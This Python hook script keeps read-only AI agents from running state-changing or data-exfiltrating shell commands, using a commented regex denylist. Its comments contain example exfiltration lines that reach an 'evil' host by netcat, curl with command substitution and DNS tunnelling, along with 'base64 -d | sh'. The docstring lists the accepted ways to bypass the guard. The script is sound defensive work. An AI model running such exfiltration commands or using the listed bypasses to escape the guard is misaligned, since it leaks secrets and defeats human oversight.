#!/usr/bin/env python3
"""PreToolUse guard — enforce read-only agents at the command level.

Wired into the read-only agents that still need Bash for observation
(sre-engineer, code-reviewer, security-reviewer) via their
`hooks: PreToolUse` frontmatter. Claude Code pipes the pending tool call as JSON on
stdin; this denies Bash commands that CHANGE STATE (prod or repo) so "read-only" is
enforced, not merely promised. Read-only triage commands (cf logs/app/events, git
log/diff/status, grep, curl GET, redirect to /dev/null, etc.) pass through untouched.

Honest boundary — this is NOT a sandbox. It is a denylist that blocks the COMMON
state-changing and data-egress VERBS for a COOPERATIVE agent; it is defense-in-depth,
not a security boundary. It cannot stop a determined adversary who fully controls the
command string (obfuscation, novel interpreters, encodings, and new tools will always
out-run a regex denylist). The LOAD-BEARING control is OS-level least-privilege
credentials (read-only CAPI / CF scopes that physically cannot mutate prod) plus an
outbound network allowlist. Treat this guard as a speed-bump that catches the obvious,
not as the thing standing between an attacker and production.

What it blocks (common verbs): cf writes, gh/GitHub writes, git writes, file/process/
service mutations, package installs (incl. cargo/go/uv/poetry/apk/pacman), HTTP writes,
output redirection to a file, tee, cp, in-place sed/perl, common nested shell/interpreter
bypasses, running local SCRIPTS or build/orchestration verbs (make/docker/terraform/
kubectl/ansible-playbook/npx/mvn/gradle, `bash deploy.sh`, `./run.sh`, `source x`,
`python3 mutate.py`, `node x.js`, `ruby x.rb`), and the common DATA-EGRESS / exfiltration
channels (the lethal-trifecta exit): raw-socket tools (nc/ncat/netcat/socat/telnet), HTTP
egress carrying command substitution, DNS-tunnel lookups carrying substitution, and a bare
`sh`/`bash` consuming a piped script on stdin. Plain GET health checks, plain DNS lookups,
and read-only interpreter probes (`python3 --version`, `python3 -m json.tool`) still pass.
Covered by scripts/test_readonly_guard.py (pure-stdlib, runs offline).

Known residuals (ACCEPTED BY DESIGN — do not chase with more regex): a regex denylist cannot
fully parse shell, so a state-changing verb deliberately hidden behind shell *evaluation* will pass
— e.g. backtick command substitution (``x=`git push` ``), a verb after a shell *keyword* the anchor
doesn't enumerate (`for r in *; do git push; done`), `eval "$cmd"`, or a base64/hex-decoded payload
piped to an interpreter. These are exactly the "adversary fully controls the command string" cases
the Honest boundary above disclaims; the containment for them is OS-level least-privilege creds +
the network allowlist, NOT this pattern. We match COMMAND-POSITION verbs (start of line / after a
separator / subshell opener / VAR=val / wrapper / a path to the binary), which catches the forms a
COOPERATIVE agent actually emits; we intentionally do not try to out-parse an adversarial shell.

Decision is returned as a permissionDecision JSON on stdout with exit 0 (the documented
non-error path). See https://code.claude.com/docs/en/hooks

Cross-platform: pure Python stdlib, no jq. Agents invoke this through
`scripts/readonly-guard-hook.sh`, NOT directly — read that file before changing the wiring.

The hook USED to be an inline `"$(command -v python3 || command -v python)" -c ...`, on the belief
that it "selects python3, else python on Windows". That belief was WRONG and it silently DISABLED THE
GUARD on Windows: `command -v python3` SUCCEEDS there — it resolves the Microsoft Store *alias stub*
(on by default in Win 10/11) — so the `|| python` fallback never fired, the stub exited non-zero, this
script never ran, no decision was emitted, and Claude Code let the command through. Read-only agents
had no guard at all, and nothing said so. The launcher now (1) picks an interpreter that WORKS rather
than one that merely RESOLVES, and (2) FAILS CLOSED — if it cannot start, it denies.
"""
import json
import re
import sys

# Leading-wrapper tolerance shared by the command-position anchors: an optional `sudo`, `env FOO=1`,
# `xargs`, `nice -n 10`, `time`, `timeout 5`, `parallel`, `nohup`, etc. before the real command — plus the
# shell keywords `do`/`then`/`else`/`elif` that introduce a command inside a loop/conditional body
# (`for f in *; do rm $f; done`, `if …; then rm x; fi`). Without it, `sudo install ...` / `xargs rm` /
# `do rm ...` would slip past the position-anchored patterns below. Bounded to a single command via
# [^|;&\n] so it can't span a pipeline OR a newline — the trailing `\n` exclusion keeps this lazy run from
# rescanning to end-of-string at every line under re.MULTILINE (a superlinear blow-up on long multiline
# commands); a mutation on a later line is still anchored by that line's own `^`. `timeout`/`time` both
# listed (\btime\b does not match `timeout`). Keywords are safe here: a read never places `do <verb>` in
# command position, and quoted/argument positions (`grep "do rm" f`) lack the anchor that precedes _WRAP.
_WRAP = (
    r"(?:(?:sudo|doas|xargs|parallel|nice|env|time|timeout|command|nohup|setsid|stdbuf|ionice|"
    r"flock|watch|busybox|do|then|else|elif)\b[^|;&\n]*?\s)?"
)

# Leading `VAR=val` env-assignment prefix (`FOO=1 rm …`, `TZ="a b" rm …`, `GIT_SSH_COMMAND=… git push`).
# The value may be a QUOTED string containing spaces, so a bare `\S+` (which stops at the first space)
# would let the mutator escape after a quoted-whitespace value — accept a quoted string OR a bare token.
_ASSIGN = r"(?:\w+=(?:\"[^\"]*\"|'[^']*'|\S+)\s+)*"

# Command-position anchor: the start of a command. Kept in lockstep with _GIT_CMD (below) so every
# _CMD-anchored rule catches the same positions the git rule does — otherwise a mutation is caught in one
# form and missed in another. A command starts at: string start (modulo indentation), after a
# separator/pipe (`|;&`, so `&&`/`||` too), after a subshell/brace opener (`(` `{`) that is itself in
# command position (start-of-line or after separator/whitespace — NOT inside a quoted argument like
# `grep "{ rm x }"`), or after find's `-exec`/`-execdir`/`-ok`/`-okdir` (which run the following token as
# a command; require a preceding whitespace so `grep "-exec rm"` — where `-exec` sits inside quotes — is
# not treated as an anchor). Then, optionally: leading `VAR=val` assignments, a sudo/wrapper prefix
# (_WRAP), and an absolute/relative path to the binary (`(?:\S*/)?`, so `/bin/rm` anchors like bare `rm`).
# `\s*` sits OUTSIDE the alternation so indentation after `^` is consumed (a bare `^` + wrapper would miss
# `\n  rm`). Residual (accepted, matching the cooperative-agent posture): a mutation crafted with no
# whitespace before a `(`/`{` in mid-token (`foo(rm x)`) is not classified — bash wouldn't parse it as a
# subshell anyway.
_CMD = (
    r"(?:"
      r"^"
      r"|[|;&]"
      r"|(?:(?<=^)|(?<=[|;&\s]))[(){}]"
      r"|(?<=\s)-exec(?:dir)?\b"
      r"|(?<=\s)-ok(?:dir)?\b"
    r")\s*"
    + _ASSIGN
    + _WRAP
    + r"[\"']?"          # an optional quote around the command WORD: `"rm" -rf`, `'kill' -9`
    + r"(?:\S*/)?"
)

# Git accepts GLOBAL options BETWEEN `git` and the subcommand (`git -C <path> push`, `git -c k=v commit`,
# `git --git-dir=… --work-tree=… add`, `git --no-pager reset`). Without tolerating that prefix, the verb
# anchor `\bgit\s+(push|commit|…)` is bypassed by the idiomatic, non-adversarial `git -C repo …` form.
# Matches a run of global options (those that take a value consume the following token) so the write-verb
# and config-write rules can anchor AFTER it. `\S+` stays within one command (no separators inside a token).
# A global-option VALUE: a quoted string (which may contain spaces — `git -C "/repo with space"`, common
# on Windows / shared drives) or a bare whitespace-delimited token. A plain `\S+` would stop at the first
# space inside a quoted path and let the trailing write verb escape the anchor.
_VAL = r"(?:\"[^\"]*\"|'[^']*'|\S+)"
_GIT_PRE = (
    r"(?:(?:"
    r"-C\s+" + _VAL + r"|-c\s+" + _VAL + r"|"
    r"--git-dir(?:=" + _VAL + r"|\s+" + _VAL + r")|--work-tree(?:=" + _VAL + r"|\s+" + _VAL + r")|"
    r"--namespace(?:=" + _VAL + r"|\s+" + _VAL + r")|"
    r"--exec-path(?:=" + _VAL + r")?|--config-env=" + _VAL + r"|"
    r"-p|--paginate|--no-pager|--bare|--no-replace-objects|--literal-pathspecs|--no-optional-locks|"
    r"--(?:no-)?(?:glob|noglob|icase)-pathspecs"
    r")\s+)*"
)

# Command-position prefix for `git` itself. A bare `\bgit\s+<verb>` also matches a git verb that
# appears only as an ARGUMENT or search text (`grep "git push" file`, `echo "git commit"`) — a
# false-positive denial of a read. We instead require git to be in COMMAND position, but more
# permissively than plain `_CMD` so we don't REGRESS real write forms the bare `\bgit` caught:
#   - start of string, modulo leading whitespace;
#   - after a separator/pipe (`;` `&` `|`, so `&&`/`||` too) or a subshell/brace opener (`(` `{`);
#   - after leading `VAR=val` assignments (`GIT_SSH_COMMAND=… git push` is a real idiom);
#   - after a sudo/env-style wrapper; and `(?:\S*/)?` re-admits an absolute/relative path to the binary.
# The trailing write-verb list still gates it, so a git READ in any of these positions (`(git log)`)
# stays allowed. Residual (accepted — matches the guard's cooperative-agent / non-sandbox posture and
# the rest of the denylist): a git write hidden after a shell *keyword* (`...; do git push`) is not
# perfectly classified; the load-bearing control is OS-level least-privilege creds + a network allowlist,
# not this regex. The `(` / `{` anchors require command position (start-of-line or after separator/
# whitespace) so `grep "(git push)" file` — the verb sitting inside a quoted argument — stays allowed.
_GIT_CMD = (
    r"(?:"
      r"^"
      r"|[|;&]"
      r"|(?:(?<=^)|(?<=[|;&\s]))[(){}]"
    r")\s*"
    + _ASSIGN
    + _WRAP
    + r"(?:\S*/)?git\s+"
)

# Command-position prefix for `cf` and `gh` — the exact treatment `git` already gets from _GIT_CMD.
# Before this, both were bare `\bcf\s+(push|…)` / `\bgh\s+(pr|issue)\s+(merge|…)`, which broke in BOTH
# directions at once:
#   FALSE NEGATIVE — a global option between the binary and the verb slid past the anchor, so
#     `cf -v push app` and `gh --repo o/r pr merge 1` (both valid, both idiomatic) deployed and merged.
#   FALSE POSITIVE — with no command-position anchor, the verb as SEARCH TEXT was denied, so
#     `grep "cf push" README.md` — a read — was blocked. (git was immune to both, via _GIT_PRE/_GIT_CMD.)
# One asymmetry, two faces; anchoring fixes both. `(?:\S*/)?` (inherited from _CMD) keeps the
# absolute-path form caught: `/usr/local/bin/cf push`.
_CF_CMD = _CMD + r"cf\s+"
_GH_CMD = _CMD + r"gh\s+"

# cf's GLOBAL OPTIONS are exactly two — `-v` and `-h`/`--help` (cf CLI v8 reference, GLOBAL OPTIONS;
# `-v` doubles as --version on the top-level go-flags struct). They may precede the command word.
_CF_PRE = r"(?:(?:-v|-h|--help)\s+)*"

# gh has no root `--repo`: `-R`/`--repo` is a PERSISTENT flag on `gh pr`/`gh issue`/`gh release`. But
# Cobra (TraverseChildren=false) calls stripFlags() to find the subcommand while IGNORING flag position,
# then hands the flags to the leaf — so `gh --repo o/r pr merge 1` parses and MERGES. Verified live
# against the GitHub API. Tolerate a run of leading flags (with optional values, `=` or space-separated)
# so the write-verb list still gates: a gh READ behind the same flags (`gh -R o/r pr view 1`) stays allowed.
_GH_PRE = r"(?:-{1,2}[A-Za-z][^\s]*(?:\s+[^-\s]\S*)?\s+)*"

# Every cf write command carries a SHORT ALIAS (each command's `ALIAS:` in cf help / the `alias:` struct
# tags in cloudfoundry/cli command_list_v7.go). The denylist matched only the long names, so the shortest
# spelling of the most destructive commands — `cf p` (push), `cf d` (delete) — went straight through.
# Read-only aliases (a=apps, s=services, t=target, e=env, r=routes, o=orgs) are deliberately NOT here.
# Do not hand-extend this list from memory: regenerate it from `cf help -a`.
# Only aliases CONFIRMED against those two sources are listed — no guesses. Commands whose alias was
# not confirmed (quotas, domains, security groups) are still covered by their LONG name in the rule
# below; the residual is that their short alias, if one exists, is not caught. Close that by
# regenerating from `cf help -a` on a real cf v8 install, not by pattern-matching this list.
_CF_WRITE_ALIASES = (
    r"push|p|delete|d|restart|rs|restage|rg|stop|sp|start|st|"
    r"create-service|cs|bind-service|bs|unbind-service|us|delete-service|ds|"
    r"create-service-key|csk|delete-service-key|dsk|create-service-broker|csb|"
    r"create-user-provided-service|cups|update-user-provided-service|uups|"
    r"bind-route-service|brs|unbind-route-service|urs|"
    r"set-env|se|unset-env|ue|run-task|rt|create-org|co|create-space|csp|"
    r"set-running-environment-variable-group|srevg|set-staging-environment-variable-group|ssevg"
)

# State-changing command patterns — denied for read-only agents. Case-insensitive.
_DENY_PATTERNS = [
    # PCF / cf CLI writes: deploys, scaling, lifecycle, routes, services, env, ssh, tasks
    _CF_CMD + _CF_PRE + r"(?:v3-)?(?:" + _CF_WRITE_ALIASES + r")\b",
    _CF_CMD + _CF_PRE + r"(?:v3-)?(push|delete|delete-[a-z-]+|scale|restart|restage|restart-app-instance|stop|start|"
    r"stage|map-route|unmap-route|create-route|delete-route|set-env|unset-env|set-label|unset-label|rename|bind-service|"
    r"unbind-service|create-service|update-service|create-user-provided-service|"
    r"update-user-provided-service|delete-user-provided-service|create-service-key|"
    r"delete-service-key|enable-ssh|disable-ssh|ssh(?!-)|run-task|terminate-task|rollback|"
    r"continue-deployment|cancel-deployment|create-app|delete-app|copy-source|set-droplet|"
    r"set-health-check|bind-route-service|unbind-route-service|share-service|unshare-service|"
    r"create-org|delete-org|create-space|delete-space|set-org-role|unset-org-role|"
    r"set-space-role|unset-space-role|create-buildpack|update-buildpack|delete-buildpack|"
    r"enable-feature-flag|disable-feature-flag|create-quota|update-quota|set-quota|"
    r"create-space-quota|update-space-quota|set-space-quota|bind-security-group|"
    r"unbind-security-group|bind-staging-security-group|unbind-staging-security-group|"
    r"create-security-group|update-security-group|add-network-policy|remove-network-policy|"
    r"enable-org-isolation|create-isolation-segment|install-plugin|uninstall-plugin|"
    r"set-running-environment-variable-group|set-staging-environment-variable-group)\b",
    _CF_CMD + _CF_PRE + r"curl\b[^|;&\n]*-X\s*(POST|PUT|DELETE|PATCH)",
    _CF_CMD + _CF_PRE + r"curl\b[^|;&\n]*--request[=\s]+(POST|PUT|DELETE|PATCH)",
    _CF_CMD + _CF_PRE + r"curl\b[^|;&\n]*(--data(-raw|-binary|-urlencode)?|\s-d[\s'\"@=])",
    # GitHub CLI writes: PR/issue/release/workflow/secrets/repo mutations. _GH_CMD anchors gh to command
    # position (so `grep "gh pr merge" ci.md` is a read, not a denial); _GH_PRE absorbs a leading
    # `-R/--repo …` that Cobra accepts BEFORE the subcommand.
    _GH_CMD + _GH_PRE + r"(pr|issue)\s+(create|edit|close|reopen|merge|ready|lock|unlock|comment|review)\b",
    _GH_CMD + _GH_PRE + r"workflow\s+run\b",
    _GH_CMD + _GH_PRE + r"run\s+(rerun|cancel|delete)\b",
    _GH_CMD + _GH_PRE + r"(secret|variable)\s+(set|delete|remove)\b",
    _GH_CMD + _GH_PRE + r"release\s+(create|delete|edit|upload)\b",
    _GH_CMD + _GH_PRE + r"repo\s+(create|delete|fork|edit|rename|sync|archive|unarchive)\b",
    _GH_CMD + _GH_PRE + r"api\b[^|;&\n]*(-X\s*(POST|PUT|DELETE|PATCH)|--method[=\s]+(POST|PUT|DELETE|PATCH))",
    # git writes: history, remote, index, or worktree mutations. _GIT_CMD anchors git to command
    # position (no false positive when a git verb is only grep'd/echoed text) while keeping absolute-path
    # coverage; _GIT_PRE tolerates git's global-option prefix (git -C <path> / -c k=v / --work-tree=… /
    # --no-pager) so it can't bypass the verb anchor.
    _GIT_CMD + _GIT_PRE + r"(add|mv|rm|push|commit|reset|rebase|merge|cherry-pick|revert|clean|am|apply|"
    r"restore|checkout|switch|pull|stash|gc|prune|init|worktree|update-ref|update-index|"
    r"symbolic-ref|filter-branch|branch\s+-[dDmM]|tag\s+-d|"
    r"remote\s+(add|rm|remove|set-url))\b",
    # git config WRITE: a dotted key followed by a value, or an explicit write flag.
    # Reads (`--get`/`--list`) lack the trailing value, so they pass through. _GIT_CMD/_GIT_PRE as above.
    _GIT_CMD + _GIT_PRE + r"config\s+(?:--\S+\s+)*\S+\.\S+\s+\S",
    _GIT_CMD + _GIT_PRE + r"config\s+(--unset|--unset-all|--replace-all|--add|--rename-section|--remove-section)\b",
    # filesystem mutations. Command-position anchored via _CMD (like the `install`/editor rules below),
    # NOT a bare `\b(rm|cp|…)\b`: these short verbs also occur as ARGUMENTS or inside hyphen tokens, so a
    # bare boundary wrongly denies reads — `grep -rn "rm -rf" .` (rm as search text), `cf app cp-service` /
    # `cat my-cp-notes.txt` (`cp` in a hyphen token). Because _CMD mirrors _GIT_CMD, the real forms all stay
    # caught in command position: `rm …`, `sudo cp …`, `find . | xargs rm`, `x && mkdir y`, `/bin/rm -rf x`
    # (abs path), `VAR=1 rm x`, `(rm x)` / `{ rm x; }` (subshell/brace), and `find … -exec rm {} \;`.
    _CMD + r"(rm|rmdir|mv|cp|rsync|dd|truncate|shred|chmod|chown|chgrp|ln|mkfs|mkdir|touch)\b",
    _CMD + r"find\b[^|;&\n]*\s-delete\b",
    # GNU install copies/creates files; anchored to command position because 'install'
    # is also a common path component (e.g. `ls /opt/install`) and a package subcommand.
    _CMD + r"install\b",
    # interactive/line editors and awk are file writers (in command position to avoid grep'd-text false positives)
    _CMD + r"(vim|vi|nvim|nano|emacs|ex|pico|ed)\b",
    r"\b[gmn]?awk\b.*system\s*\(",
    # PowerShell mutations, for Windows shells behind the Bash tool name. Command-position anchored (via
    # _CMD, which includes `|` and `{`) so a pipeline/scriptblock write (`Get-ChildItem | Remove-Item`,
    # `& { Remove-Item x }`) is caught but the cmdlet name as an ARGUMENT (`Get-Help Remove-Item`) is not.
    _CMD + r"(Remove-Item|Move-Item|Copy-Item|New-Item|Set-Content|Add-Content|Out-File|"
    r"Set-Item|Clear-Item|Rename-Item|Set-ItemProperty|New-ItemProperty|Remove-ItemProperty|"
    r"Start-Service|Stop-Service|Restart-Service|Set-Service|Stop-Process|Start-Process)\b",
    # in-place file editors
    r"\bsed\s+(-[^\s]*i|--in-place)",
    r"\bperl\s+-[^\s]*i",
    # shell output redirection to a file (allow >/dev/null and fd-dup like 2>&1), and tee.
    # Target charset includes quotes so `awk '{print > "f"}'` is caught; tee is anchored to
    # command position so `ps aux | grep tee` (tee as search text) is not a false positive.
    # The (?<![-=]) look-behind keeps arrows like `->`/`=>` (common in greps, jq, commit
    # messages) from being misread as redirection — a real redirect is never preceded by - or =.
    r"(?<![-=])>>?\s*\|?\s*(?!&|/dev/null\b)[\"'~./$A-Za-z0-9_-]",
    r"(?:^|[|;&]\s*)tee\b",
    # process / service / power mutations. Command-position anchored (via _CMD) so the verb as SEARCH
    # TEXT or inside a hyphenated app/file name is not a false positive — `cf logs kill-switch-app`,
    # `cat pre-shutdown-checklist.md`, `grep -n "pkill" runbook.md` are reads and must pass; the real
    # forms (`kill -9 1234`, `pkill -f java`, `shutdown -h now`, `sudo systemctl restart x`) stay caught.
    _CMD + r"(kill|pkill|killall)\b",
    _CMD + r"(systemctl|service)\s+(start|stop|restart|reload|enable|disable)\b",
    _CMD + r"(shutdown|reboot|halt|poweroff)\b",
    # package / dependency installs (state change, out of scope for read-only triage). Command-position
    # anchored so `grep -rn "pip install" docs/` (search text) is not denied.
    _CMD + r"(apt|apt-get|yum|dnf|zypper|pip|pip3|npm|pnpm|yarn|gem|brew|choco)\s+"
    r"(install|remove|uninstall|update|upgrade|add)\b",
    # more package managers the original list missed (command-position anchored like the rest)
    _CMD + r"cargo\s+install\b",
    _CMD + r"(go)\s+(install|get)\b",
    _CMD + r"uv\s+pip\s+install\b",
    _CMD + r"poetry\s+(add|install)\b",
    _CMD + r"(apk\s+add|pacman\s+-S)\b",
    # HTTP writes, file downloads/uploads (these mutate the local FS or a remote)
    r"\bcurl\b.*(-X\s*(POST|PUT|DELETE|PATCH)|--request\s+(POST|PUT|DELETE|PATCH))",
    r"\bcurl\b.*(--data(-raw|-binary|-urlencode)?|--form|\s-d[\s'\"@=]|\s-F[\s'\"@=])",
    # curl flags are case-sensitive (-O/-o/-T differ), so scope these out of the IGNORECASE compile
    r"\bcurl\b.*(\s(?-i:-O)\b|\s--remote-name\b|\s(?-i:-o)\s+(?!/dev/null|-)|\s(?-i:-T)\s|\s--upload-file\b)",
    r"\bwget\b(?!.*(-O\s*-|-qO-|--output-document[= ]-))",  # wget writes a file unless piped to stdout
    r"\b(scp|sftp)\b",
    # crontab edits/loads (mutations); a bare `crontab -l` listing is read-only and passes.
    r"\bcrontab\s+(?!-l\b)\S",
    # --- Data-egress / exfiltration channels (the lethal-trifecta exit) ------------------
    # A read-only agent can read secrets; these stop it from shipping them out. Raw-socket
    # tools are a clean exfil channel with no read-only-triage need on our stack (ThousandEyes
    # owns synthetics; `curl -v https://host` covers HTTP reachability). Command-position
    # anchored, so `cat secret | nc evil 443` is caught at the pipe too.
    _CMD + r"(nc|ncat|netcat|socat|telnet)\b",
    # HTTP egress that embeds command/process substitution — `curl "...?d=$(cat secret)"` or
    # a backtick/`<(...)`. Bounded to the curl/wget segment via [^|;&] so a downstream
    # `| grep $(...)` is NOT a false positive; plain GET health checks have no substitution.
    r"\b(curl|wget)\b[^|;&]*(\$\(|`|<\()",
    # DNS-tunnel exfil — dig/nslookup/host carrying substitution (`dig $(whoami).evil.com`).
    # Command-position anchored; plain lookups (`dig example.com`) still pass.
    _CMD + r"(dig|nslookup|host)\b[^|;&]*(\$\(|`|<\()",
    # Nested shells/interpreters are too easy to use as mutation bypasses.
    # Shell interpreters: -c / /c / -Command run an inline command string.
    r"\b(bash|sh|zsh|pwsh|powershell|cmd)\b.*\s(-c|/c|-Command|-File)\b",
    # Code interpreters: -c/-e/-E/-p/--eval/--print eval inline code — perl/ruby/node -e
    # are exact peers of python -c. A bare trailing `-` or a heredoc feeds a script on stdin.
    r"\b(python|python3|py|perl|ruby|node)\b.*\s(-c|-e|-E|-p|--eval|--print)\b",
    r"\b(python|python3|py|perl|ruby|node|bash|sh|zsh|pwsh|powershell)\s+-(\s|$)",
    r"\b(python|python3|py|perl|ruby|node|bash|sh|zsh|pwsh|powershell)\b[^|;&]*<<-?\s*[\"']?\w",
    # --- running local SCRIPTS / build & orchestration verbs --------------------------------
    # A read-only agent has no business executing arbitrary local scripts or kicking off
    # build/deploy/orchestration runners — these are open-ended state changes. Conservative on
    # purpose: only fire on forms that clearly RUN something, not on read-only sub-commands.
    # Build / orchestration runners (bare verb in command position; covers `make target`,
    # `docker run ...`, `terraform apply`, `kubectl ...`, `ansible-playbook ...`, `npx ...`).
    _CMD + r"(make|docker|terraform|kubectl|ansible-playbook|npx|mvn|gradle)\b",
    # cargo/go run-or-build (install/get already covered above). Command-position anchored like the
    # make/docker rule, so observation-only text — `rg "go build" .`, `grep "cargo build" notes` —
    # is NOT a false-positive; only an actual `go build`/`cargo run` in the command slot is blocked.
    # The `(?:\S*/)?` prefix also catches an absolute-path toolchain: `/usr/local/go/bin/go build`,
    # `/usr/bin/cargo run`. (A read-only `command -v go` doesn't run anything and stays allowed.)
    _CMD + r"(?:\S*/)?(go|cargo)\s+(run|build)\b",
    # An interpreter invoked on a script FILE (not an inline-code flag, not a read-only probe).
    # `bash deploy.sh`, `sh ./run.sh`, `zsh path/to/x.sh` — arg ending in .sh or a path. The
    # optional `(?:\S*/)?` prefix closes the absolute-path bypass: `/bin/bash deploy.sh` is treated
    # identically to bare `bash deploy.sh` (the inline `-c`/`-e` forms above already cover abs paths
    # via `\b`; these file-exec rules were command-position-anchored and missed the path prefix).
    _CMD + r"(?:\S*/)?(bash|sh|zsh)\s+[\"'./~$A-Za-z0-9_-]*\S+\.sh\b",
    _CMD + r"(?:\S*/)?(bash|sh|zsh)\s+\.{0,2}/\S+",
    # `python3 ./mutate.py`, `node x.js|.mjs|.cjs`, `ruby x.rb` — a script-file argument.
    # The earlier `-c/-e/--eval` and `--version`/`-m` forms are read-only and pass through.
    r"\b(python|python3|py)\s+(?!-)\S*\.py\b",
    r"\bnode\s+(?!-)\S*\.(js|mjs|cjs)\b",
    r"\bruby\s+(?!-)\S*\.rb\b",
    # `python -m py_compile`/`-m compileall` WRITE bytecode (.pyc) — not read-only. Use a pure-read
    # syntax check instead (e.g. `python3 -c "import ast,sys; ast.parse(open(sys.argv[1]).read())"`).
    r"\bpy(thon3?)?\s+(?:-\S+\s+)*-m\s+(py_compile|compileall)\b",
    # Direct execution of a local file by RELATIVE path in command position: `./deploy.sh`,
    # `../bin/x`, `bin/run`, `scripts/x.sh`. The leading char must be a non-`/` path char, so
    # ABSOLUTE paths (`/bin/cat`, `/usr/local/bin/cf apps`, `/opt/splunk/bin/splunk search`) are
    # NOT caught here — a read-only binary invoked by absolute path is fine, and an absolute-path
    # *mutating* command is still caught by its verb rule (`/bin/rm` → the fs-verb rule, whose `_CMD`
    # anchor carries a `(?:\S*/)?` binary-path prefix; `…/cf push` → the cf-write rule). Anchored to
    # command position so a path ARGUMENT (`cat path/to/file`) is
    # not — `cat` holds the command slot there. The fleet's own bundled read-only triage helper is
    # exempted up front via _ALLOW_RE (it's a relative path that would otherwise trip this).
    r"(?:^|[|;&]\s*)[A-Za-z0-9_.~-]+/\S*",
    # An ABSOLUTE path to a SCRIPT FILE (by extension) in command position — `/tmp/x.sh`,
    # `/opt/app/deploy.py`. Absolute paths to BINARIES (`/bin/cat`, `/usr/local/bin/cf`) have no
    # script extension and stay allowed (handled above); this blocks running an arbitrary local
    # *script* by absolute path, which the relative-path rule above would otherwise miss. The bundled
    # triage helper is invoked by its relative `.claude/skills/...` path and allowlisted via _ALLOW_RE.
    r"(?:^|[|;&]\s*)/\S*\.(sh|bash|zsh|py|rb|js|mjs|cjs|pl|ps1)\b",
    # Sourcing a file pulls its (possibly mutating) commands into the current shell.
    r"(?:^|[|;&]\s*)source\b",
    r"(?:^|[|;&]\s*)\.\s+\S",
    # A bare `sh`/`bash`/`zsh` at the END of a pipeline consumes a script on stdin
    # (`... | base64 -d | sh`) — no `-c` needed. Anchored to a pipe so it's the sink. The
    # `(?:\S*/)?` prefix closes the absolute-path form (`... | /bin/sh`), matching the script-file rules.
    r"\|\s*(sudo\s+)?(?:\S*/)?(sh|bash|zsh)\s*(\||$|;|&)",
]
# re.MULTILINE so the command-position anchor `^` matches at the start of EVERY line, not just the whole
# string — otherwise a state-changing verb on a later line of a multiline Bash command (`echo hi\ngit
# push`) would slip past every `(?:^|…)`-anchored rule. A newline is a command separator just like `;`.
_DENY_RE = re.compile("|".join(_DENY_PATTERNS), re.IGNORECASE | re.MULTILINE)

# Allowlist: the fleet's own bundled READ-ONLY triage helper, at its EXACT bundled path
# `.claude/skills/pcf-ops/scripts/triage.{sh,ps1}` (the path pcf-ops/foundations.md documents).
# The path-exec / `bash …​.sh` rules above would otherwise (wrongly) deny it. Pinned to the bundled
# path (optional leading `./`) so an attacker-planted look-alike at a DIFFERENT path —
# `/tmp/evil/pcf-ops/scripts/triage.sh`, or a CWD-relative `pcf-ops/scripts/triage.sh` — is NOT
# exempted. Anchored to the WHOLE command (optional interpreter prefix, optional args, but no command
# separators) so a chained mutation like `triage.sh; rm -rf /` does NOT get a free pass — that falls
# through to the deny rules. Args are bounded by [^|;&] to forbid pipelines/chaining.
_ALLOW_RE = re.compile(
    r"^\s*(?:bash\s+|pwsh\s+(?:-File\s+)?)?"
    r"(?:\./)?\.claude/skills/pcf-ops/scripts/triage\.(?:sh|ps1)"
    r"(?:\s+[^|;&]*)?\s*$",
    re.IGNORECASE,
)

_REASON = (
    "Blocked: this is a read-only agent. The command appears to change state "
    "(deploy/scale/restart, GitHub or git write, file/process/service mutation, package install, "
    "nested shell, or an HTTP write) or to exfiltrate data (raw-socket tool, or HTTP/DNS egress "
    "carrying command substitution). For reachability use ThousandEyes or a plain `curl`/`dig`; "
    "for a state change, recommend it and hand off to the owning writer agent with human sign-off "
    "(see the production-change-gate skill for prod)."
)


def main() -> None:
    try:
        # Read raw bytes and decode with utf-8-sig so a leading BOM (which some Windows shells
        # and pipes prepend) is stripped reliably, regardless of the locale encoding.
        raw = sys.stdin.buffer.read().decode("utf-8-sig", errors="replace")
        data = json.loads(raw) if raw.strip() else {}
    except Exception:
        sys.exit(0)  # unparseable input -> don't interfere with the normal permission flow

    if data.get("tool_name") != "Bash":
        sys.exit(0)

    command = (data.get("tool_input") or {}).get("command", "") or ""
    # The allowlist is a SINGLE-command exemption; require a single line so a multiline command that
    # merely STARTS with the triage helper (`triage.sh\nrm -rf /`) can't ride the exemption past the
    # (now MULTILINE) denylist. A legitimate triage invocation is always one line.
    if "\n" not in command and "\r" not in command and _ALLOW_RE.match(command):
        sys.exit(0)  # bundled read-only triage helper — explicitly permitted
    if _DENY_RE.search(command):
        print(json.dumps({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": _REASON,
            }
        }))
    sys.exit(0)


if __name__ == "__main__":
    main()
